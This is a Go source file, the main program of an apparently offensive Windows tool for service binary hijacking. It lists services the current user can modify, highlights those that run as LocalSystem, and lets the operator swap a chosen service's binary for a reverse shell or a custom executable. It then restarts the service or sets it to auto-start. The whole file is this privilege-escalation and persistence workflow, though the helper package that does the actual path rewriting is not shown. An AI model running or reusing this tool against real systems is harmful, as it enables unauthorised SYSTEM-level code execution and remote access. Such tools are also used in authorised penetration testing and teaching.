package main

import (
	"fmt"
	"strings"

	"os"

	"github.com/Luke5080/win-binary-hijacking/internal/enumwin"
	"github.com/fatih/color"
)

func main() {
	// Setting up all variables we need
	// variables to hold user input,
	// slice to hold user options and the
	// user homedir

	var userChoice, binaryChoice int

	binaryOptions := [2]string{"Reverse Shell", "Custom binary"}

	homeDir, _ := os.UserHomeDir()

	// Slice holding of type *enum.WeakServ to display
	// choice of services that are exploitable to the user.
	var userOptions []*enumwin.WeakServ

	// Pointer to our menu colour struct
	m := enumwin.SetMenu()

	text, err := os.ReadFile(homeDir + `\win-binary-hijacking\internal\banner\banner.txt`)

	if err != nil {
		m.CT.Println("Could not read banner: ", err)
	}

	m.CD.Println(string(text))

	m.CT.Println("Author: Luke Marshall")

	chanBack := enumwin.EnumServ()

	// Itterate through values in returned channel
	// and append them to the userOptions slice
	for val := range chanBack {
		userOptions = append(userOptions, val)
	}

	if len(userOptions) > 0 {
		m.CG.Println("\n\nCan Modify the following services:")

		// Display each entry in the userOptions slice
		// as well as their index to provide menu of
		// options for the user
		for index, val := range userOptions {
			formatOption := m.CD.Sprintf("%d: %s", index+1, val.Name)

			if val.CanStart {
				formatOption += m.CG.Sprintf(" CAN START")
			}

			if val.CanStop {
				formatOption += m.CG.Sprintf(" CAN STOP")
			}

			if strings.ToLower(val.StartName) == "localsystem" {
				formatOption += m.CG.Sprintf(" STARTS AS LocalSystem")
			}

			fmt.Println(formatOption)
		}

		m.CT.Println("\n\nChoose a service to modify:")

		r, err := fmt.Scanln(&userChoice)

		// Error handling for user choice input
		// Personal Notes: Scanln returns number of
		// succesfully read arguments and err
		// If arguments read = 0 or err != nil
		// Ask for input again. Similarily, if
		// user choice is not an index of the
		// the the userOptions slice, ask again
		for r != 1 || err != nil || userChoice > len(userOptions) || userChoice <= 0 {
			r, err = fmt.Scanln(&userChoice)
		}

		color.Red("\nWhat binary would you like to replace the service binary with?\n")

		for index, val := range binaryOptions {
			m.CT.Printf("%d: %s\n", index+1, val)
		}

		fmt.Scanln(&binaryChoice)

		for r != 1 || err != nil || binaryChoice > len(binaryOptions) || binaryChoice <= 0 {
			r, err = fmt.Scanln(&binaryChoice)
		}

		ws := enumwin.ChangeBinPath(userOptions[userChoice-1], binaryChoice, m)

		if ws.CanStart && ws.CanStop {
			var startChoice string
			m.CD.Println("Can Start/Stop Service...")
			m.CD.Println("Restart Service? [y/n]")
			r, err := fmt.Scanln(&startChoice)

			startChoice = strings.ToLower(startChoice)

			for r != 1 || err != nil {
				r, err = fmt.Scanln(&startChoice)

				startChoice = strings.ToLower(startChoice)
			}

			switch startChoice {
			case "y":
				err := enumwin.StopServ(ws)

				if err != nil {
					m.CD.Println("Error Stopping service.")
				}

				err = enumwin.StartServ(ws)

				if err != nil {
					m.CD.Println("Error Starting service")
				}

				m.CG.Println("Service started succesfully")

				m.CG.Println("Service Name: ", ws.Name)
				m.CG.Println("Start Type: ", ws.StartMode)
				m.CG.Println("Starts As: ", ws.StartName)
				m.CG.Println("New binary path: ", ws.BinPath)

			case "n":
				m.CD.Println("Exiting")
				os.Exit(1)
			default:
				m.CD.Println("Bad Input")
			}

		} else {
			m.CD.Println("Service start type has been set to AUTO_START")
			m.CD.Println("Please reboot this system to start service")

			m.CG.Println("Service Name: ", ws.Name)
			m.CG.Println("Start Type: ", ws.StartMode)
			m.CG.Println("Starts As: ", ws.StartName)
			m.CG.Println("New binary path: ", ws.BinPath)
		}

	} else {
		m.CT.Println("No services found which you can modify")
	}

}
